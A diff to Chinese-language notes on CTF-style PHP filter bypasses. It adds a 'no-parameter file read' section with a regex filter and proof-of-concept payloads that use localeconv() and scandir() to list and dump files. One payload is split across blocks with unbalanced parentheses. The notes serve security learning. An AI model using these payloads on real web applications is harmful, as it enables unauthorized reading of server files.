@@ -129,7 +129,32 @@ O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
 
 ## 函数名取反绕过
 
-## data://协议
+## data://协议 php://input ...
+
+## 无参数读文件
+
+过滤条件
+```php
+preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])
+';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['exp'])
+```
+
+利用``current(localeconv()) pos(localeconv()) === .``
+
+POC:
+
+```php
+show_source(array_rand(array_flip(scandir(current(localeconv()))))); #随机当前读目录下文件
+chdir(next(scandir(pos(localeconv()) #chdir(next(scandir(pos(localeconv()
+```
+
+```
+echo(readfile(end(scandir())))))));
+```
+
+### 参考资料
+
+https://www.cnblogs.com/wangtanzhi/p/12311239.html
 
 ## 利用字符串函数名执行特性rce
 
